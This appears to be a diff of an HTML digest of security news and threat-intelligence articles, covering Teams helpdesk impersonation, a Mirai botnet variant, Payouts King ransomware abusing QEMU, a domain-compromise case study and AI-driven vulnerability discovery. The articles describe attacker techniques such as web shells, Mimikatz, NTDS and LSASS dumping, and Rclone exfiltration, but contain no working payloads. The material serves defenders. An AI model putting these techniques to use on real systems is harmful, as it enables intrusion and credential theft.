| extend FirstContact = isnotnull(FCTime) ); // Join path 1: Teams victim object ID -> alert AccountObjectId let _matches_oid = _teams_fc | where isnotempty(VictimAccountObjectId) | join hint.strategy=broadcast kind=leftouter ( _alerts_by_oid ) on $left.VictimAccountObjectId == $right.AccountObjectId // Time bound keeps only alerts near the Teams activity; widen/narrow _timeFrame to tune sensitivity | where isnull(ATime) or ATime between (TTime .. TTime + _timeFrame) | extend MatchType = "ObjectId"; // Join path 2: Teams victim UPN -> alert AccountUpn let _matches_upn = _teams_fc | where isnotempty(VictimUPN) | join hint.strategy=broadcast kind=leftouter ( _alerts_by_upn ) on $left.VictimUPN == $right.AccountUpn | where isnull(ATime) or ATime between (TTime .. TTime + _timeFrame) | extend MatchType = "VictimUPN"; // Join path 3: Teams chat thread -> alert chat thread let _matches_thread = _teams_fc | where isnotempty(ChatThreadId) | join hint.strategy=broadcast kind=leftouter ( _alerts_by_thread ) on ChatThreadId | where isnull(ATime) or ATime between (TTime .. TTime + _timeFrame) | extend MatchType = "ChatThreadId"; // // add branch 4 for host events // // Merge all match paths and collapse multiple alert hits per Teams event into one row union _matches_oid, _matches_upn, _matches_thread | summarize AlertTitles = make_set(Title, 50), AlertIds = make_set(AlertId, 50), MatchTypes = make_set(MatchType, 10), FirstAlertTime = min(ATime) by TTime, SenderUPN, SenderDisplayName, VictimUPN, VictimAccountObjectId, ChatThreadId, |
+Protecting your organization from collaboration‑based impersonation attacks as demonstrated throughout this intrusion chain, cross‑tenant helpdesk impersonation campaigns rely less on platform exploitation and more on persuading users to initiate trusted remote access workflows within legitimate enterprise collaboration tools such as Microsoft Teams.
+Organizations should treat any unsolicited external support contact as inherently suspicious and implement layered defenses that limit credential‑backed remote sessions, enforce Conditional Access with MFA and compliant device requirements, and restrict the use of administrative protocols such as WinRM to authorized management workstations. At the endpoint and identity layers, enabling Attack Surface Reduction (ASR) rules, Zero‑hour Auto Purge (ZAP), Safe Links for Teams messages, and network protection can reduce opportunities for sideloaded execution and outbound command‑and‑control activity that blend into routine HTTPS traffic.
+Finally, organizations should reinforce user education—such as establishing internal helpdesk authentication phrases and training employees to verify external tenant indicators—to prevent adversaries from converting legitimate collaboration workflows into attacker‑guided remote access and staged data exfiltration pathways.
+References
+[Protection Against Email Bombs with Microsoft Defender for Office 365 | Microsoft Community Hub](https://techcommunity.microsoft.com/blog/MicrosoftDefenderforOffice365Blog/protection-against-email-bombs-with-microsoft-defender-for-office-365/4418048)[Protection against multi-modal attacks with Microsoft Defender | Microsoft Community Hub](https://techcommunity.microsoft.com/blog/microsoftdefenderforoffice365blog/protection-against-multi-modal-attacks-with-microsoft-defender/4438786)[Help on the line: How a Microsoft Teams support call led to compromise | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2026/03/16/help-on-the-line-how-a-microsoft-teams-support-call-led-to-compromise/)[Disrupting threats targeting Microsoft Teams | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/)
+This research is provided by Microsoft Defender Security Research with contributions from Jesse Birch, Sagar Patil, Balaji Venkatesh S (DEX), Eric Hopper, Charu Puhazholi, and other members of Microsoft Threat Intelligence.
+Learn More
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
             <h2 class="article-title">Mirai Variant Nexcorium Exploits CVE-2024-3721 to Hijack TBK DVRs for DDoS Botnet</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/mirai-variant-nexcorium-exploits-cve.html" target="_blank">Original Link</a></p>
             <div class="content-text">Threat actors are exploiting security flaws in TBK DVR and end‑of‑life (EoL) TP-Link Wi-Fi routers to deploy [Mirai](https://thehackernews.com/2025/01/mirai-botnet-launches-record-56-tbps.html)-botnet variants on compromised devices, according to findings from Fortinet FortiGuard Labs and Palo Alto Networks Unit 42.
@@ -86,121 +239,6 @@ The attacks, in this case, attempt to deploy a Mirai-like botnet malware, with t
 Given that the affected TP‑Link devices are no longer actively supported, users are advised to replace them with a newer model and ensure that default credentials are not used.
 "For the foreseeable future, the security landscape will continue to be shaped by the persistent risk of default credentials in IoT devices," Unit 42 said. "These credentials can turn a limited, authenticated vulnerability into a critical entry point for determined attackers."
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Payouts King ransomware uses QEMU VMs to bypass endpoint security</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/payouts-king-ransomware-uses-qemu-vms-to-bypass-endpoint-security/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Payouts King ransomware is using the QEMU emulator as a reverse SSH backdoor to run hidden virtual machines on compromised systems and bypass endpoint security.
-QEMU is an open-source CPU emulator and system virtualization tool that allows users to run operating systems on a host computer as virtual machines (VMs).
-Since security solutions on the host cannot scan inside the VMs, attackers can use them to execute payloads, store malicious files, and create [covert remote access tunnels](https://www.bleepingcomputer.com/news/security/hackers-abuse-qemu-to-covertly-tunnel-network-traffic-in-cyberattacks/) over SSH.
-For these reasons, QEMU has been abused in past operations from multiple threat actors, including the [3AM ransomware group](https://www.bleepingcomputer.com/news/security/3am-ransomware-uses-spoofed-it-calls-email-bombing-to-breach-networks/), [LoudMiner cryptomining](https://www.bleepingcomputer.com/news/security/linux-cryptominer-uses-virtual-machines-to-attack-windows-macos/), and [‘CRON#TRAP’ phishing](https://www.bleepingcomputer.com/news/security/windows-infected-with-backdoored-linux-vms-in-new-phishing-attacks/).
-Researchers at cybersecurity company Sophos documented two campaigns where attackers deployed QEMU as part of their arsenal and to collect domain credentials.
-One campaign that Sophos tracks as STAC4713 was first observed in November 2025 and has been linked to the Payouts King ransomware operation.
-The other, tracked as STAC3725, has been spotted in February this year and exploits the CitrixBleed 2 (CVE‑2025‑5777) vulnerability in NetScaler ADC and Gateway instances.
-Running Alpine Linux VMs
-Researchers note that the threat actors behind the STAC4713 campaign are associated with the GOLD ENCOUNTER threat group, which is known to target hypervisors and encryptors for VMware and ESXi environments.
-According to Sophos, the malicious actor creates a scheduled task named ‘TPMProfiler’ to launch a hidden QEMU VM as SYSTEM.
-They use virtual disk files disguised as databases and DLL files, and set up port forwarding to provide covert access to the infected host via a reverse SSH tunnel.
-The VM runs Alpine Linux version 3.22.0 that includes attacker tools such as AdaptixC2, Chisel, BusyBox, and Rclone.
-[Sophos notes](https://www.sophos.com/en-us/blog/qemu-abused-to-evade-detection-and-enable-ransomware-delivery) that initial access was achieved via exposed SonicWall VPNs, while exploitation of the SolarWinds Web Help Desk vulnerability CVE-2025-26399 was observed in more recent attacks.
-In the post-infection phase, the threat actors used VSS (vssuirun.exe) to create a shadow copy, then used the print command over SMB to copy NTDS.dit, SAM, and SYSTEM hives to temp directories.
-More recently observed incidents attributed to the threat actor relied on other initial access vectors. The researchers say that in an attack in February, GOLD ENCOUNTER used an exposed Cisco SSL VPN, and in March they posed as IT staff and tricked employees over Microsoft Teams into downloading and installing QuickAssist.
-"In both instances, the threat actors used the legitimate ADNotificationManager.exe binary to sideload a Havoc C2 payload (vcruntime140_1.dll) and then leveraged Rclone to exfiltrate data to a remote SFTP location" - [Sophos](https://www.sophos.com/en-us/blog/qemu-abused-to-evade-detection-and-enable-ransomware-delivery)
-According to a [Zscaler report](https://www.zscaler.com/blogs/security-research/payouts-king-takes-aim-ransomware-throne) this week, Payouts King is likely tied to former BlackBasta affiliates, based on its use of similar initial access methods like spam bombing, [Microsoft Teams phishing](https://www.google.com/url?client=internal-element-cse&cx=partner-pub-0920899300397823:3529943228&q=https://www.bleepingcomputer.com/news/security/black-basta-ransomware-poses-as-it-support-on-microsoft-teams-to-breach-networks/&sa=U&ved=2ahUKEwjD8LO_i_WTAxVHcKQEHV__NWsQFnoECAYQAg&usg=AOvVaw2E_bbaHRqhKd_5aAjxKnWX), and [Quick Assist abuse](https://www.google.com/url?client=internal-element-cse&cx=partner-pub-0920899300397823:3529943228&q=https://www.bleepingcomputer.com/news/security/windows-quick-assist-abused-in-black-basta-ransomware-attacks/&sa=U&ved=2ahUKEwiIj_7Gi_WTAxV0VqQEHUb_LjQQFnoECAUQAg&usg=AOvVaw1zssIFjNVIatuWuHE8GKB_).
-The strain employs heavy obfuscation and anti-analysis mechanisms, establishes persistence via scheduled tasks, and terminates security tools using low-level system calls.
-Payouts King encryption scheme uses AES-256 (CTR) with RSA-4096 with intermittent encryption for larger files. The dropped ransom notes point victims to leak sites on the dark web.
-The second campaign that Sophos observed (STAC3725), has been active since February and exploits the CitrixBleed 2 vulnerability to gain initial access to target environments.
-After compromising NetScaler devices, the attackers deploy a ZIP archive containing a malicious executable that installs a service named ‘AppMgmt,’ creates a new local admin user (CtxAppVCOMService), and installs a ScreenConnect client for persistence.
-The ScreenConnect client connects to a remote relay server and establishes a session with system privileges, then drops and extracts a QEMU package that runs a hidden Alpine Linux VM using a custom.qcow2 disk image.
-Instead of using a pre-built toolkit, the attackers manually install and compile their tools, including Impacket, KrbRelayx, Coercer, BloodHound.py, NetExec, Kerbrute, and Metasploit, inside the VM.
-Observed activity includes credential harvesting, Kerberos username enumeration, Active Directory reconnaissance, and staging data for exfiltration via FTP servers.
-Sophos recommends that organizations look for unauthorized QEMU installations, suspicious scheduled tasks running with SYSTEM privileges, unusual SSH port forwarding, and outbound SSH tunnels on non-standard ports.
-[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
-AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
-At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">Containing a domain compromise: How predictive shielding shut down lateral movement</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/04/17/domain-compromise-predictive-shielding-shut-down-lateral-movement/" target="_blank">Original Link</a></p>
-            <div class="content-text">In identity-based attack campaigns, any initial access activity can turn an already serious intrusion into a critical incident once it allows a threat actor to obtain domain-administration rights. At that point, the attacker effectively controls the Active Directory domain: they can change group memberships and Access Control Lists (ACLs), mint Kerberos tickets, replicate directory secrets, and push policy through mechanisms like Group Policy Objects (GPOs), among others.
-What makes domain compromise especially challenging is how quickly it could happen: in many real-world cases, domain-level credentials are compromised immediately following the very first access, and once these credentials are exposed, they’re often abused immediately, well before defenders can fully scope what happened. Apart from this speed gap, responding to this type of compromise could also prove difficult. For one, incident responders can’t just simply “turn off” domain controllers, service accounts, or identity infrastructure and core services without risking business continuity. In addition, because compromised credential artifacts can spread fast and be replayed to expand access, restoring the identity infrastructure back to a trusted state usually means taking steps (for example, [krbtgt rotation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password), [GPO cleanup](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-backup-restore), and [ACL validation](https://learn.microsoft.com/en-us/windows/win32/ad/how-access-control-works-in-active-directory-domain-services)) that could take additional time and effort in an already high-pressure situation.
-These challenges highlight the need for a more proactive approach in disrupting and containing credential-based attacks as they happen. Microsoft Defender’s predictive shielding capability in automatic attack disruption helps address this need. Its ability to predict where attacks will pivot next and apply just in time hardening actions to block credential abuse—including those targeting high-privilege accounts like domain admins—and lateral movement at near-real-time speed, shifting the advantageto the defenders.
-Previously, we [discussed](https://www.microsoft.com/en-us/security/blog/2026/03/23/case-study-predictive-shielding-defender-stopped-gpo-based-ransomware-before-started/) how predictive shielding was able to disrupt a human-operated ransomware incident. In this blog post, we take a look at a real-world Active Directory domain compromise that illustrates the critical inflection point when a threat actor achieves domain -level control. We walk through the technical details of the incident to highlight attacker tradecraft, the operational challenges defenders face after domain compromise, and the value of proactive, exposure-based containment that predictive shielding provides.
-Predictive shielding overview
-[Predictive shielding](https://learn.microsoft.com/en-us/defender-xdr/shield-predict-threats) is a capability in Microsoft Defender’s [automatic attack disruption](https://learn.microsoft.com/en-us/defender-xdr/automatic-attack-disruption) that helps stop the spread of identity-based attacks, before an attacker fully operationalizes stolen credentials. Instead of waiting for an account to be observed doing something malicious, predictive shielding focuses on moments when credentials are likely exposed: when Defender sees high-confidence signals of credential theft activity on a device, it can proactively restrict the accounts that might have been exposed there.
-Essentially, predictive shielding works as follows:
-- Defender detects post-breach activity strongly associated with credential exposure on a device.
-- It evaluates which high-privilege identities were likely exposed in that context.
-- It applies containment to those identities to reduce the attacker’s ability to pivot, limiting lateral movement paths and high-impact identity operations while the incident is being investigated and remediated. The intent is to close the “speed gap” where attackers can reuse newly exposed credentials faster than responders can scope, reset, and clean up.
-This capability is available as an out-of-the-box enhancement for Microsoft Defender for Endpoint P2 customers who meet the Microsoft Defender prerequisites.
-The following section revisits a real-world domain compromise that showcases how attack disruption and predictive shielding changed the outcome by acting on exposure, rather than just observed abuse. Interestingly, this case happened just as we’re rolling out the [predictive shielding](https://www.microsoft.com/en-us/security/blog/2026/03/23/case-study-predictive-shielding-defender-stopped-gpo-based-ransomware-before-started/?msockid=036f567c77ca6191158a408b767d60a9), so you can see the changes in both attacker tradecraft and the detection and response actions before and after this capability was deployed.
-Attack chain overview
-In June 2025, a public sector organization was targeted by a threat actor. This threat actor progressed methodically: initial exploitation, local escalation, directory reconnaissance, credential access, and expansion into Microsoft Exchange and identity infrastructure.
-Initial entry: Pre-domain compromise
-The campaign began at the edge: a file-upload flaw in an internet-facing Internet Information Services (IIS) server was abused to plant and launch a web shell. The attacker then simultaneously performed various reconnaissance activities using the compromised account through the web shell and escalated their privileges to NT AUTHORITY\SYSTEM by abusing a Potato-class token impersonation primitive (for example, BadPotato).
-The discovery commands observed in the attack include the following example:
-Using the compromised IIS service account, the attacker attempted to reset the passwords of high-impact identities, a common technique used to gain control over accounts without performing credential dumping. The attacker also deployed Mimikatz to dump logon secrets (for example, MSV, LSASS, and SAM), harvesting credentials that are exposed on the device.
-Had predictive shielding been released at this point, automated restrictions on exposed accounts could have stopped the intrusion before it expanded beyond the single-host foothold. However, at the time of the incident, this capability hasn’t been deployed to customers yet.
-Key takeaway: At this stage of an attack, it’s important to keep the containment host‑scoped. Defenders should prioritize blocking credential theft and stopping escalation before it reaches the identity infrastructure.
-First pivot: Directory credential materialization and Exchange delegation
-Within 24 hours, the attacker abused privileged accounts and remotely created a scheduled task on a domain controller. The task initiated NTDS snapshot activity and packaged the output using makecab.exe, enabling offline access to directory credential material that’s suitable for abusing credentials at scale:
-Because the first malicious action by the abused account already surfaced the entire Active Directory credentials, stopping its path for total domain compromise was no longer feasible.
-The threat actor then planted a Godzilla web shell on Exchange Server, used a privileged context to enumerate accounts with ApplicationImpersonation role assignments, and granted full access to a delegated principal across mailboxes using Add‑MailboxPermission. This access allowed the threat actor to read and manipulate all mailbox contents.
-The attack also used Impacket’s atexec.py to enumerate the role assignments remotely. Its use triggered the attack disruption capability in Defender, revoking the account sessions of an admin account and blocking it from further use.
-Following the abused account’s disruption, the attacker attempted several additional actions, such as resetting the disrupted account’s and other accounts’ passwords. They also attempted to dump credentials of a Veeam backup device.
-Key takeaway: This pivot is a turning point. Once directory credentials and privileged delegation are in play, the scope and impact of an incident expand fast. Defenders should prioritize protecting domain controllers, privileged identities, and authentication paths.
-Scale and speed: Tool return, spraying, and lateral movement
-Weeks later, the threat actor returned with an Impacket tooling (for example, secretsdump and PsExec) that resulted in repeated disruptions by Defender against the abused accounts that they used. These disruptions forced the attacker to pivot to other compromised accounts and exhaust their resources.
-Following Defender’s disruptions, the threat actor then launched a broad password spray from the initially compromised IIS server, unlocking access to at least 14 servers through password reuse. They also attempted remote credential dumping against a couple of domain controllers and an additional IIS server using multiple domain and service principals.
-Key takeaway: Even though automatic attack disruption acted right away, the attacker already possessed multiple credentials due to the previous large-scale credential dumping. This scenario showcases the race to detect and disrupt credential abuse and is the reason we’re introducing predictive shielding to preemptively disrupt exposed accounts at risk.
-Predictive shielding breaks the chain: Exposure-centric containment
-In the second phase of the attack, we activated predictive shielding. When exposure signals surfaced (for example, credential dumping attempts and replay from compromised hosts), automated containment blocked new sign-in attempts and interactive pivots not only for the abused accounts, but also for context-linked identities that are active on the same compromised surfaces.
-Attack disruption contained high-privileged principals to prevent these accounts from being abused. Crucially, when a high-tier Enterprise or Schema Admin credential was exposed, predictive shielding contained it pre-abuse, preventing what would normally become a catastrophic escalation.
-Second pivot: Alternative paths to new credentials
-With high-value identities pre-contained, the threat actor pivoted to exploiting Apache Tomcat servers. They compromised three Tomcat servers, dropped the Godzilla web shell, and launched the PowerShell-based Invoke-Mimikatz command to harvest additional credentials. At one point, the attacker operated under Schema Admin:
-They then used Impacket WmiExec to access Microsoft Entra Connect servers and attempt to extract Entra Connect synchronization credentials. The account used for this pivot was later contained, limiting further lateral movement.
-Last attempts and shutdown
-In the final phase of the attack, the threat actor attempted a full LSASS dump on a file sharing server using comsvcs.dll MiniDump under a domain user account, followed by additional NTDS activity:
-Attack disruption in Defender repeatedly severed sessions and blocked new sign-ins made by the threat actor. On July 28, 2025, the attack campaign lost momentum and stopped.
-How predictive shielding changed the outcome
-Before compromising a domain, attackers are mostly constrained by the hosts they control. However, even a small set of exposed credentials could remove their constraints and give them broad access through privileged authentication and delegated pathways. The blast radius spreads fast, time pressure spikes, and containment decisions become riskier because identity infrastructure and high-privilege accounts are production dependencies.
-The incident we revisited earlier almost followed a similar pattern. It unfolded while predictive shielding was still being launched, so the automated predictive containment capability only became active at the midway of the attack campaign. During the attack’s first stages, the threat actor had room to scale—they returned with new tooling, launched a broad password spray attack, and expanded access across multiple servers. They also attempted remote credential dumping against domain controllers and servers.
-When predictive shielding went live, it helped shift the story and we then saw the change of pace—instead of reacting to each newly abused account, the capability allowed Defender to act preemptively and turn credential theft attempts into blocked pivots. Defender was able to block new sign-ins and interactive pivots, not just for the single abused account, but also for context-linked identities that were active on the same compromised surfaces.
-With high-value identities pre-contained, the adversary shifted tradecraft and chased other credential sources, but each of their subsequent attempts triggered targeted containment that limited their lateral reach until they lost momentum and stopped. How this incident concluded is the operational “tell” that containment is working, in that once privileged pivots get blocked, threat actors often hunt for alternate credential sources, and defenses must continue following the moving blast radius.
-As predictive shielding matures, it will continue to expand its prediction logic and context-linked identities.
-MITRE ATT&CK® techniques observed
-The following table maps observed behaviors to ATT&CK®.
-Tactics shown are per technique definition.
-| Tactic(s) | Technique ID | Technique name | Observed details |
-| Initial Access | T1190 | Exploit Public-Facing Application | Exploited a file-upload vulnerability in an IIS server to drop a web shell. |
-| Persistence | T1505.003 | Server Software Component: Web Shell | Deployed web shells for persistent access. |
-| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Used PowerShell for Exchange role queries, mailbox permission changes, and Invoke-Mimikatz. |
-| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Used BadPotato to escalate to SYSTEM on an IIS server. |
-| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Dumped LSASS using Mimikatz and comsvcs.dll MiniDump. |
-| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Performed NTDS-related activity using ntdsutil snapshot/IFM workflows on a domain controller. |
-| Execution; Persistence; Privilege Escalation | T1053.005 | Scheduled Task/Job: Scheduled Task | Created remote scheduled tasks to execute under SYSTEM on a domain controller. |
-| Discovery | T1087.002 | Account Discovery: Domain Account | Enumerated domain groups and accounts using net group and AD Explorer. |
-| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Used admin shares/SMB-backed tooling (for example, PsExec) for lateral movement. |
-| Lateral Movement | T1021.003 | Remote Services: Windows Remote Management | Used WmiExec against Microsoft Entra Connect servers. |
-| Credential Access | T1110.003 | Brute Force: Password Spraying | Performed password spraying leading to access across at least 14 servers. |
-| Collection | T1114.002 | Email Collection: Remote Email Collection | Expanded mailbox access broadly through impersonation or permission changes. |
-| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Web shells communicated over HTTP/S. |
-| Defense Evasion | T1070.004 | Indicator Removal on Host: File Deletion | Used cleanup scripts (for example, del.bat) to remove dump artifacts. |
-| Persistence; Privilege Escalation | T1098 | Account Manipulation | Manipulated permissions and roles to expand access and sustain control. |
-| Credential Access | T1078 | Valid Accounts | Reused compromised service and domain accounts for access and lateral movement. |
-Learn more
-For more information about automatic attack disruption and predictive shielding, see the following Microsoft Learn articles:
-- Check out our latest Ninja
-[show](https://youtu.be/u9nXRABIw1k?si=A6X9q1rHFqKPVtQb)showcasing how predictive shielding expands to identity centric attacks [Automatic attack disruption in Microsoft Defender XDR](https://learn.microsoft.com/en-us/defender-xdr/automatic-attack-disruption)[Predictive shielding in Microsoft Defender (Preview)](https://learn.microsoft.com/en-us/defender-xdr/shield-predict-threats)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
@@ -289,111 +327,6 @@ They are usually doing it with the infrastructure those organizations already fo
             <hr class="separator">
         </div>
         <div id="art-5" class="article-body">
-            <h2 class="article-title">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/defending-enterprise-ai-vulnerabilities/" target="_blank">Original Link</a></p>
-            <div class="content-text">Defending Your Enterprise When AI Models Can Find Vulnerabilities Faster Than Ever
-Francis deSouza
-Google Cloud COO and President, Security Products
-Mandiant and Google Threat Intelligence Group
-⠀
-Introduction
-Advances in AI model-powered exploitation have demonstrated that general-purpose AI models can excel at vulnerability discovery, even without being purpose-built for the task. Eventually, capabilities such as these will be integrated directly into the development cycle, and code will be more difficult to exploit than ever; however, this transition creates a critical window of risk. As we harden existing software with AI, threat actors will use it to discover and exploit novel vulnerabilities.
-Faced with this scenario, defenders have two critical tasks: hardening the software we use as rapidly as possible, and preparing to defend systems that have not yet been hardened.
-As noted in Wiz’s blog post, [Claude Mythos: Preparing for a World Where AI Finds and Exploits Vulnerabilities Faster Than Ever](https://www.wiz.io/blog/claude-mythos), now is the time to strengthen playbooks, reduce exposure, and incorporate AI into security programs. The following blog provides an overview of the evolving attack lifecycle, how threat actors will weaponize these capabilities, and a roadmap for modernizing enterprise defensive strategies.
-Exploits in the Adversary Lifecycle
-Historically, the discovery of novel vulnerabilities and the subsequent development of zero-day exploits required significant time, specialized human expertise, and resources. Today, highly capable AI models are increasingly demonstrating the ability to not only identify vulnerabilities but also help generate functional exploits, lowering the barrier to entry for threat actors. Continued advancements in these capabilities will increasingly make exploit development achievable for threat actors of all skill levels, significantly compressing the attack timeline. GTIG has already observed [threat actors leveraging LLMs for this purpose](https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use) as well as the marketing of this capability within [AI tools and services advertised in underground forums](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools).
-A significant shift in the economics of zero-day exploitation will enable mass exploitation campaigns, ransomware and extortion operations, and an increased volume of activity from actors who previously guarded these capabilities and used them sparingly.
-Accelerated exploit deployment is a trend we’ve already been observing among advanced adversaries. In our [2025 Zero-Days in Review](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) report, we noted that PRC-nexus espionage operators have become increasingly adept at rapidly developing and distributing exploits among otherwise separate threat groups. This has significantly shrunk the historical gap between public vulnerability disclosure and widespread mass exploitation, a trend we expect to continue.
-This evolving landscape will almost certainly result in meaningful shifts over the coming year:
-Scaling Defenses for Machine-Speed Threats
-We have long anticipated that AI models would become capable of vulnerability discovery—which is why we’ve been using AI tools like [Big Sleep](https://blog.google/innovation-and-ai/technology/safety-security/cybersecurity-updates-summer-2025/), [CodeMender](https://deepmind.google/blog/introducing-codemender-an-ai-agent-for-code-security/), and [OSS-Fuzz to proactively find and fix vulnerabilities over the years](https://bughunters.google.com/open-source-security/oss-fuzz).
-Now as threat actors leverage AI to significantly multiply their offensive output, enterprise defenders cannot rely on human-speed patching protocols to keep up. When organizations are confronted with an AI-enabled surge in vulnerabilities, traditional security tooling and manual triage will fail to keep pace.
-Attempting to absorb this exponential increase in workload using legacy processes will result in severe overload and burnout for security and development teams. The question is no longer just about proactive scanning and adherence to traditional patching SLAs; it is about whether organizations are empowering their workforce with the automation needed to eliminate manual toil. To prepare for this reality, organizations must integrate AI defensively, shifting the role of the security practitioner from manual investigator to strategic coordinator.
-A Modern, AI-Integrated Defensive Roadmap
-In order to modernize the traditional vulnerability roadmap, organizations must incorporate automation and prioritize resilience.
-Organizations are no longer defending against purely human-speed exploitation. AI-enabled adversaries can identify, chain, and weaponize weaknesses faster than traditional vulnerability management programs were designed to respond. A modern roadmap should therefore emphasize [automation, resilience, and continuous validation](https://cloud.google.com/security/consulting/mandiant-cybersecurity-transformation).
-This roadmap is organized in two parts. The first outlines advanced modernization priorities for organizations that are ready to evolve their security programs to achieve defense at AI enabled speeds. The second provides foundational guidance for organizations that are still building core vulnerability management capabilities.
-Advanced Modernization Priorities
-Secure Your Code
-Organizations have historically focused on patching and securing tangible assets like laptops, servers, and network infrastructure. In today’s threat landscape, that same discipline must be applied to source code, code libraries, and the systems used to build and deploy it.
-Code repository platforms should be tightly protected and accessible only through trusted internal networks, managed identities, or other strongly controlled access paths. Organizations should proactively scan for secrets within their codebase that may be weaponized by adversaries and eliminate any practice of storing sensitive credentials in plaintext.
-Similarly, organizations are still accountable for vulnerable code from their supply chains, and they must proactively plan for and defend against attacks through exploitation of compromised code libraries. This creates a conflict with updating versions and repositories immediately against holding onto known and trusted versions.
-Accordingly, security controls should cover build runners, CI/CD pipelines, and other automated execution mechanisms, which are increasingly attractive targets for threat actors. AI-enabled scanning tools can help teams detect critical vulnerabilities faster and uncover groups of weaknesses that may appear minor on their own but could be chained together for exploitation.
-Organizations should leverage frameworks like [Wiz SITF](https://www.wiz.io/blog/sitf-sdlc-threat-framework) to map their SDLC threat model and identify "attack chains" where minor, isolated weaknesses are combined by AI to create a critical breach. Additionally, one-time static or dynamic scanning is no longer sufficient. Organizations should deploy emerging commercial and open-source agentic solutions to review code and mitigate flaws before they can be exploited.
-Move to Automated Security Operations
-Traditional dashboards and static detection rules will struggle under the volume of automated attacks. Security operations need to become more dynamic, with a clear path toward an agentic SOC.
-Legacy models are often reactive and constrained by manual workflows, By deploying specialized AI agents such as Google Cloud’s Triage and Investigation Agent and Gemini in [Google Security Operations](https://cloud.google.com/security/products/security-operations), teams can automate alert triage, analyze suspicious code without manual reverse engineering, correlate signals across multiple tools, and generate response playbooks in real time. This allows analysts to spend less time on repetitive investigation and more time on high-value decisions, helping the SOC respond to AI-enabled attacks at AI speed.
-Reduce Attack Surface
-Organizations should design networks with a zero trust approach and focus first on reducing exposure across internet-facing systems, critical infrastructure, control planes, and trusted service infrastructure.
-Network segmentation and identity-based access controls should be in place so that if an edge device is compromised through a zero-day exploit, the blast radius is limited and easier to contain.
-Maintain Continuous Asset Discovery and Posture Management
-Unidentified assets are a major blindspot for organizations and a critical weakness that AI-enabled threat actors are able to exploit with increasing efficiency. Static spreadsheets and manual asset tracking are no longer a viable and scalable strategy.
-Security teams need a continuously updated, automated inventory covering endpoints, servers, public-facing systems, network infrastructure, AI systems, cloud environments and ephemeral assets like Kubernetes pods. Dynamic asset discovery is critical for reducing blind spots and shadow AI. The more seamlessly known assets can be fed into downstream security tooling, the more accurate and effective frontline detection and response will be.
-Expand Automated Scanning Coverage
-Automated vulnerability scanning should cover every major operating system in use, including Windows, macOS, and Linux, across both endpoints and servers.
-Reduce blind spots and maintain continuous, comprehensive visibility into vulnerabilities. Where possible, that visibility should feed directly into automated remediation pipelines.
-Enhance Network Device Patching and Limit Connectivity
-Organizations need a highly automated, repeatable process for identifying missing firmware and security updates on network devices and for scheduling maintenance efficiently. Network infrastructure has long been a preferred target for sophisticated threat actors, and AI will only accelerate the discovery of weaknesses in these often-overlooked systems.
-Organizations should use perimeter controls to block unnecessary outbound connections from internal network devices. Any attempt by those devices to communicate externally should be investigated to determine whether it is required for normal operations or signals something more concerning. Proactively, organizations should baseline what outbound connections are normal, in order to alert against anomalies.
-Formalize Emergency Remediation SLAs
-AI may help accelerate patching, but emergency response still depends on clear human processes.
